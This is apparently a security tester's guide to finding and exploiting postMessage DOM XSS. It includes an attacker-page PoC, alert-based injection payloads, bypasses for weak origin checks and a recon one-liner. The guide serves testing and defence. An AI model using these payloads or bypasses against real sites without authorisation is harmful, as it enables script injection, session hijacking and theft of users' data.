# postMessage XSS (DOM-based Cross-Site Scripting)

The `postMessage` API enables cross-origin communication between windows, iframes, and pop-ups. When the receiving application does not validate the sender's `origin` (or validates it weakly) and then processes `event.data` in an unsafe way, an attacker on any site can push attacker-controlled data into the victim page's DOM. This yields DOM-based XSS: data theft, session hijacking, and arbitrary JavaScript execution in the target's origin — typically a medium/high finding when sensitive data or actions are reachable.

Workflow for general XSS hunting: [Xss.md](./Xss.md).

## Hunting Checklist

1. In the site's JavaScript, search for listeners: `addEventListener("message"`, `onmessage`, `attachEvent`.
2. For every listener, check whether `event.origin` / `event.source` are validated before the data is used; note weak checks (`endsWith`, `indexOf(...) !== -1`, regex without `^...$` anchors).
3. Trace where `event.data` flows: sinks like `document.body.innerHTML`, `eval`, `setTimeout`, `src`/`href` assignment, jQuery `$(...).html()`.
4. Find senders using `postMessage(..., "*")` — any window can trigger app logic with crafted payloads.
5. Check whether messages are parsed from JSON without schema/field checks (type confusion).
6. Test with a `null` origin: sandboxed iframe or `data:` URI (see Bypass Techniques).
7. Verify exploitability from your own page using the PoC below against the target's listener.

## Test Cases & Examples

### How postMessage works

```javascript
window.postMessage(message, targetOrigin, [transfer]);
```

- `message`: the data to send to the target window.
- `targetOrigin`: expected origin of the recipient (using `"*"` allows any origin and is insecure).
- `transfer`: optional, for passing objects.

Example of secure usage:

```javascript
window.postMessage("data", "https://trusted-site.com");
```

### Insecure implementation (no origin validation)

```javascript
window.addEventListener("message", function (event) {
    // No origin validation
    document.body.innerHTML = event.data;
});
```

Security issue: any message from any source is processed; a malicious payload (e.g. an image tag with an event handler) becomes DOM-based XSS.

### Exploitation scenario

1. The vulnerable site listens for `postMessage` events **without checking the sender's origin**.
2. The attacker hosts a malicious page that sends a **crafted message** to the vulnerable application.
3. The script executes inside the vulnerable website — **DOM-based XSS**.

### Proof of Concept

```html
<!doctype html>
<html>
<head>
    <meta charset="UTF-8" />
    <title>PostMessage XSS PoC</title>
    <script>
        function pocLink() {
            var ref = window.open('https://vulnerable-website.com'); // Open target
            ref.postMessage("<img src=x onerror=alert('XSS Exploited')>", "https://vulnerable-website.com");
        }
    </script>
</head>
<body>
    <a href="#" onclick="pocLink();">Click to Exploit</a>
    <iframe src="https://vulnerable-website.com"></iframe>
</body>
</html>
```

Breakdown:

- `window.open()` opens the **vulnerable website** in a new window.
- `postMessage()` delivers the **malicious payload** containing the XSS injection.
- With no origin validation on the receiver, the payload executes → **arbitrary JavaScript execution**.

## Bypass Techniques

Weak origin checks and how to defeat them:

- **`event.origin.endsWith("trusted-site.com")`** — register `evil-trusted-site.com` (suffix confusion):

```javascript
// From https://attacker-controlled-trusted-site.com
child.postMessage('<img src=x onerror=alert(1)>', 'https://trusted-site.com');
```

- **`event.origin.indexOf("trusted-site.com") !== -1`** — substring check: use `https://trusted-site.com.attacker.com`.
- **`null` origin** — sandboxed iframes and `data:` URIs report `origin: "null"`; if the listener trusts `"null"`, exploit it from:

```html
<iframe src="https://vulnerable-website.com" sandbox="allow-scripts allow-post-message"></iframe>
```

- **Protocol-only or missing `targetOrigin` on the sender side** — intercept/observe frames from your own page and inject into any window handle (`window.opener`, named frames, `window.frames[...]`).
- **Trusted-domain gadgets** — even with correct origin checks, if a trusted origin contains XSS itself (user-controlled subdomains, open redirect + JS URIs), relay messages through it; see [Open_Redirection](../Open_Redirection/Open_Redirection_Hunting.md).

## Tools & Resources

- Burp Suite **DOM Invlector** (manual DOM XSS verification through the browser) and Burp Suite PRO crawler JS analysis.
- [RA2 DOM XSS Scanner](https://github.com/dpnishant/ra2-dom-xss-scanner)
- JS recon: `waybackurls target.com | grep '\.js' | xargs -n1 curl -sk | grep -E 'postMessage|addEventListener\("message'`
- PortSwigger research: [postMessage JavaScript vuln analysis](https://portswigger.net/bappstore) & Web Security Academy DOM XSS material; OWASP [Testing for DOM-based attacks](https://owasp.org/www-project-web-security-testing-guide/).

## Report Tips

- Frame impact as DOM XSS in the target's origin: "an attacker page can execute JS as the victim without any interaction beyond visiting the attacker site" — cookie/token theft, actions as the user, phishing overlay.
- Include the vulnerable listener (JS file + snippet/line), the PoC HTML, and a recording of the alert firing on the victim origin.
- If origin is checked but bypassable (suffix/subdomain/null), state exactly which check was defeated — it proves the fix and often raises severity.
